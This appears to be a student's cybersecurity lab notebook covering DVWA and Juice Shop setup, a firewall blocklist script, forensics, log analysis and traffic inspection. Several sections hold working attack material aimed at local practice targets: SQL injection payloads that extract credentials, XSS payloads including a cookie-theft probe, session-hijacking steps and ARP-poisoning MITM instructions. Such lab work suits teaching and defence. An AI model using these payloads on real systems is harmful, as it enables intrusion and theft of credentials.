# Cybersecurity Lab Notes

---

## DVWA & Juice Shop Setup

```bash
# DVWA
docker run -it -p 8080:80 vulnerables/web-dvwa

# Juice Shop
docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
```

---

## Firewall — Block Malicious IPs (Feodo Tracker)

**`firewall.py`**

```python
import requests
import csv
import subprocess

# Feodo Tracker IP Blocklist URL
url = "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"

# Download CSV file
response = requests.get(url)

# Delete old firewall rules named "BadIP"
subprocess.run(
    ["powershell", "-Command", "netsh advfirewall firewall delete rule name='BadIP'"]
)

# Read CSV while ignoring comment lines starting with '#'
mycsv = csv.reader(
    filter(lambda x: not x.startswith("#"), response.text.splitlines())
)

# Process each row
for row in mycsv:
    # Extract destination IP column
    ip = row[1].strip()

    # Skip header row
    if ip != "dst_ip":
        # Outbound block rule
        rule_out = (
            f"netsh advfirewall firewall add rule "
            f"name='BadIP' "
            f"dir=out "
            f"action=block "
            f"remoteip={ip}"
        )

        # Inbound block rule
        rule_in = (
            f"netsh advfirewall firewall add rule "
            f"name='BadIP' "
            f"dir=in "
            f"action=block "
            f"remoteip={ip}"
        )

        # Execute firewall rules
        subprocess.run(["powershell", "-Command", rule_out])
        subprocess.run(["powershell", "-Command", rule_in])

        print(f"[+] Blocked IP: {ip}")

print("\nAll malicious IPs have been blocked.")
```

**Install Required Package**

```bash
pip install requests
```

**Run the Script** — Run Command Prompt or PowerShell as Administrator:

```bash
python firewall.py
```

---

## Password Strength Check

```java
import java.util.Scanner;

public class PasswordStrengthChecker {

    public static String checkPasswordStrength(String password) {
        int strength = 0;

        // Length check
        if (password.length() >= 8) { strength++; }

        // Uppercase check
        if (password.matches(".*[A-Z].*")) { strength++; }

        // Lowercase check
        if (password.matches(".*[a-z].*")) { strength++; }

        // Number check
        if (password.matches(".*[0-9].*")) { strength++; }

        // Special character check
        if (password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) { strength++; }

        // Strength evaluation
        if (strength == 5) { return "Very Strong Password"; }
        else if (strength == 4) { return "Strong Password"; }
        else if (strength == 3) { return "Medium Password"; }
        else if (strength == 2) { return "Weak Password"; }
        else { return "Very Weak Password"; }
    }

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);

        System.out.print("Enter Password: ");
        String password = sc.nextLine();

        String result = checkPasswordStrength(password);
        System.out.println("Password Strength: " + result);

        sc.close();
    }
}
```

---

## Packet Sniffing and Network Traffic Analysis

```bash
# Open terminal and start HTTP server
python3 -m http.server 8080

# Open another terminal and start packet capture
sudo tcpdump -i any -w capture.pcap port 8080

# Open browser and access
http://localhost:8080

# Stop capturing
Ctrl + C

# Open capture file in Wireshark
wireshark capture.pcap

# Apply filter in Wireshark
http.request.method == "GET"
```

---

## SQL Injection Attack

```bash
# Install DVWA
sudo apt update
sudo apt install dvwa -y

# Start services
sudo service apache2 start
sudo service mysql start

# Open DVWA
http://127.0.0.1/dvwa
```

**Payloads:**

```sql
-- Normal Input
1

-- Authentication Bypass
1' OR '1'='1

-- Find Columns
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -

-- UNION Injection
1' UNION SELECT 1,2-- -

-- Database Name
1' UNION SELECT database(),2-- -

-- Table Names
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -

-- Column Names
1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -

-- Extract Usernames and Passwords
1' UNION SELECT user,password FROM users-- -
```

---

## Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux

```bash
# Start Apache
sudo service apache2 start

# Start MySQL
sudo service mysql start

http://localhost/dvwa
```

**Payloads:**

```html
<!-- Basic XSS -->
<script>alert('XSS')</script>

<!-- Hacked -->
<script>alert('Stored XSS')</script>

<!-- DOM XSS -->
<script>alert('DOM XSS')</script>

<!-- Cookie Theft -->
<script>alert(document.cookie)</script>
```

---

## Testing Authentication Weaknesses and Session Management Using Kali Linux & DVWA

```bash
# Step 1: Start services
sudo service apache2 start
sudo service mysql start

# Step 2: Open DVWA
http://127.0.0.1/dvwa
# Login — Username: admin | Password: password

# Step 3: Set DVWA Security Level = LOW

# Step 4: Open DVWA → Vulnerabilities → Brute Force
# Try:
#   admin / admin
#   admin / 123456
#   admin / password

# Step 5: Check Cookies
# Inspect → Storage → Cookies

# Step 6: Copy PHPSESSID
# Open Private Window (Ctrl + Shift + P) → Paste same PHPSESSID → Refresh page

# Step 7: Check PHPSESSID before and after login

# Step 8: Logout from DVWA → Reuse old PHPSESSID in Private Window
```

---

## Ettercap — ARP Poisoning / MITM

```bash
# Check IP Address
ifconfig
# IP Address: 192.168.0.103

# Open Ettercap
ettercap -G

# Scan for Hosts
Hosts → Scan for Hosts

# Open Hosts List
Hosts → Hosts List

# Add Devices
Add to Target 1
Add to Target 2

# View Current Targets
Targets → Current Targets

# Start ARP Poisoning
MITM → ARP Poisoning

# Enable
Sniff Remote Connections

# Start Attack
Click OK

# Observation
ARP poisoning attack starts between victims.
```

---

## Testing IoT Device Security (Default Passwords & Open Ports)

**A. Deploy Vulnerable IoT Simulation (Docker)**

```bash
docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
docker ps
docker logs juiceshop
```

**B. Access Application (Verify Deployment)**

```
http://localhost:8090
```

**C. Identify Host IP Address**

```bash
# Windows
ipconfig

# Linux/macOS
ifconfig
```

**D. Network Scanning from Kali Linux**

```bash
nmap 10.39.169.126
nmap -sV 10.39.169.126
nmap -A 10.39.169.126
```

**E. Port + Service Enumeration**

```bash
nmap -p- 10.39.169.126
nmap -sC -sV 10.39.169.126
nmap --open 10.39.169.126
```

**F. Access IoT Dashboard from Attacker Machine**

```
http://10.39.169.126:8090
```

**G. Test Default / Weak Credentials**

```
admin / admin
admin / password
user / user
```

**H. Analyze Network Traffic**

```
Open Browser → Press F12 → Go to Network Tab → Reload page → Inspect HTTP requests
```

---

## Analysing Android App Permissions and Mobile Traffic

**A. Verify**

```bash
cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
emulator -list-avds
```

**B. Setup Proxy**

```bash
cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
adb devices
adb shell settings put global http_proxy 10.0.2.2:8080
adb shell settings get global http_proxy
```

**C. Send Certificate to Emulator**

```bash
adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
```

**E. Install Certificate in Emulator**

```
Settings → Security → Install Certificate → Select burpcer.der
```

**F. Analyze App Traffic**

```
Open Android application → Observe requests in Burp Suite
```

**G. Check App Permissions**

```
Settings → Apps → App Permissions
```

---

## Web Application Vulnerability Scanning with OWASP ZAP

**Step 1 — Install OWASP ZAP**

Download and install from: https://www.zaproxy.org/download/

**Step 2 — Run OWASP Juice Shop**

```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
```

**Step 3 — Open Juice Shop**

```
http://localhost:3000
```

**Step 4 — Start OWASP ZAP**

1. Open OWASP ZAP
2. Select: `No, I do not want to persist this session`
3. Click Start

**Step 5 — Configure Proxy**

```
HTTP Proxy : 127.0.0.1
Port       : 8080
```

**Step 6 — Perform Spider Scan**

1. Right-click: `http://localhost:3000`
2. Select: `Attack → Spider`
3. Start Scan

**Step 7 — Perform Active Scan**

1. Right-click: `http://localhost:3000`
2. Select: `Attack → Active Scan`
3. Start Scan

**Step 8 — Analyze Alerts**

Open Alerts tab to view vulnerabilities like:
- XSS
- Missing Security Headers
- Cookie Issues

**Step 9 — Generate Report**

```
Report → Generate Report → Save in HTML/PDF format
```

---

## Creating and Analyzing Disk Images Using dc3dd and Autopsy

```bash
# A. Open Terminal
Ctrl + Alt + T

# B. Create Sample Evidence
echo "Cybersecurity Lab Evidence" > evidence.txt
ls

# C. Identify Disk Partition
lsblk

# D. Create Practice Disk Image
dd if=/dev/zero of=practice_disk.dd bs=1M count=100

# E. Format / Mount Disk
mkfs.ext4 practice_disk.dd

# F. Create Forensic Image Using dc3dd
sudo dc3dd if=practice_disk.dd of=forensic_image.dd hash=md5 log=acquisition.log

# G. Verify Image and Log
ls -lh practice_disk.dd
cat acquisition.log

# H. Start Autopsy Tool
autopsy

# I. Access Autopsy in Browser
http://localhost:9999/autopsy
```

**J. Inside Autopsy (GUI Steps)**

1. Create New Case
2. Add Host
3. Add Image → Select: `/home/kali/forensic_image.dd`

**K. Optional — Useful Additional Commands**

```bash
pwd
whoami
df -h
file forensic_image.dd
md5sum forensic_image.dd
```

---

## Cross-Site Scripting (XSS) using Juice Shop and Burp Suite

**Step 1 — Run OWASP Juice Shop**

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

```
http://localhost:3000
```

**Step 2 — Configure Burp Suite Proxy**

1. Open Burp Suite
2. Go to: `Proxy → Options`
3. Set Proxy Listener: `127.0.0.1 : 8081`

```
HTTP Proxy : 127.0.0.1
Port       : 8081
```

**Step 3 — Identify XSS Vulnerability**

1. Open Juice Shop
2. Find input fields like: Search bar, Login form, Feedback form
3. In Burp Suite: `Proxy → HTTP History`
4. Send request to Repeater
5. Test payload:

```html
<script>alert("XSS")</script>
```

6. Click Send and observe response.

**Step 4 — Exploit XSS in Feedback Form**

1. Open Feedback / Contact Us page
2. Enter payload:

```html
<script>alert("XSS")</script>
```

3. Submit form → Alert popup confirms XSS vulnerability.

**Step 5 — Perform Stored XSS**

```html
<script>document.write('<img src=x onerror=alert("Stored XSS")>')</script>
```

1. Enter payload in review/feedback field
2. Submit form
3. Reload page
4. Stored alert popup appears

---

## Testing Authentication Weaknesses and Session Management using Dockerized OWASP Juice Shop on Kali Linux

**Step 1 — Install Docker**

```bash
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker

# Check version
docker --version
```

**Step 2 — Run OWASP Juice Shop**

```bash
sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

# Check container
sudo docker ps
```

**Step 3 — Open Application**

```
http://localhost:3000
```

**Step 4 — Configure Burp Suite**

1. Open Burp Suite
2. `Proxy → Intercept ON`
3. Configure browser proxy:

```
IP   : 127.0.0.1
Port : 8080
```

### Part A — Authentication Testing

**Test 1: SQL Injection Login Bypass**

```
Email    : ' OR 1=1 --
Password : anything
Result   : Login bypass successful
Inference: Application vulnerable to SQL Injection
```

**Test 2: Weak Password Policy**

```
Password used : 12345
Inference     : No strong password enforcement
```

**Test 3: Username Enumeration**

1. Try valid email + wrong password
2. Try invalid email + wrong password

```
Result   : Different error messages displayed
Inference: Valid usernames can be identified
```

### Part B — Session Management Testing

**Test 4: Session Cookie Analysis**

1. Login
2. Open: `F12 → Application → Cookies`

```
Result   : Session token visible
Inference: Check Secure and HTTPOnly flags
```

**Test 5: Session Hijacking**

1. Copy session cookie
2. Open another browser
3. Replace cookie

```
Result   : Access gained without login
Inference: Session hijacking possible
```

**Test 6: Session Fixation**

1. Note session ID before login
2. Login
3. Compare session ID

```
Result   : Same session ID remains
Inference: Session fixation vulnerability exists
```

**Test 7: Logout Mechanism**

1. Login and copy cookie
2. Logout
3. Reuse cookie

```
Result   : Session still active
Inference: Session not invalidated properly
```

**Test 8: JWT Token Analysis**

1. Copy JWT token
2. Decode using https://jwt.io

```
Result   : Payload visible
Inference: Improper token validation possible
```

**Docker Commands Used**

```bash
docker ps
docker stop juice-shop
docker start juice-shop
docker rm juice-shop
docker logs juice-shop
```

---

## Network Forensics Using Wireshark

```bash
# A. Start Wireshark
wireshark

# B. Select Network Interface
eth0
wlan0

# C. Start Capture
Click Start

# D. Generate Network Traffic
# Open browser, visit websites, ping systems

# E. Apply Filters
http
https
dns
tcp
udp
ip.addr == 192.168.1.1

# F. Stop Capture
Click Stop

# G. Analyze Packets
# Inspect: Source IP, Destination IP, Protocols, DNS Queries, HTTP Requests
```

---

## Log File Analysis for Incident Detection Lab

```bash
# A. Navigate to Log Directory
cd /var/log
ls

# B. View Successful Login Records
last

# C. View System Logs (Full)
journalctl
journalctl | less

# D. Filter Failed Login Attempts
journalctl | grep "Failed"
journalctl | grep "Failed password"

# E. View SSH Login Activity
journalctl | grep ssh

# F. Filter System Errors
journalctl | grep -i error

# G. Analyze Apache Logs
cd /var/log/apache2
ls
sudo less access.log

# H. Detect Suspicious Web Requests
grep "404" /var/log/apache2/access.log

# I. View Package Activity
less /var/log/dpkg.log

# J. Real-Time Log Monitoring
sudo journalctl -f
```

**K. Simulate Failed SSH Login Attack**

```bash
# Install SSH Server
sudo apt install openssh-server -y

# Start SSH Service
sudo service ssh start

# Find IP Address
ip a

# Generate Failed Logins
ssh fakeuser@localhost
ssh kali@localhost
```

```bash
# L. Analyze Failed Login Attempts
journalctl | grep "Failed password"

# M. Extract Suspicious IP Address
journalctl | grep "Failed password" | awk '{print $11}'

# N. Count Failed Attempts Per IP
journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr

# O. Alternative Method (Failed Logins)
sudo lastb

# P. Check Recent Log Activity
journalctl --since "10 minutes ago"
```

---

## Privacy Audit of Popular Apps (Desktop WhatsApp) and Websites (Facebook) & Data Breach Case Study Analysis

**A. Install Node.js & npm**

```bash
sudo apt update
sudo apt install nodejs npm -y
```

**B. Install Nativefier**

```bash
sudo npm install -g nativefier
```

**C. Create WhatsApp Desktop App**

```bash
nativefier https://web.whatsapp.com
ls
```

**D. Run WhatsApp Desktop**

```bash
cd WhatsAppWeb-linux-x64
./WhatsAppWeb
```

**E. Login to WhatsApp**

```
Open mobile WhatsApp → Linked Devices → Scan QR code
```

**F. Analyze Trackers (Exodus Privacy)**

```
https://reports.exodus-privacy.eu.org
```

**G. Start Wireshark Capture**

```bash
wireshark
```

**H. Generate Network Traffic**

```
Send messages, Send images, Open chats
```

**I. Apply Wireshark Filters**

```
tls
dns
```

**J. Stop Wireshark Capture**

```
Click Stop
```

**K. Open Facebook Website**

```
https://www.facebook.com
```

**L. Start Burp Suite**

```bash
burpsuite
```

**M. Configure Proxy**

```
IP   : 127.0.0.1
Port : 8080
```

**N. Enable Interception**

```
Turn Intercept ON → Reload Facebook page
```

**O. Analyze Traffic**

```
Press F12 → Open Network tab
```

**P. Check Email Data Breach**

```
https://haveibeenpwned.com
```
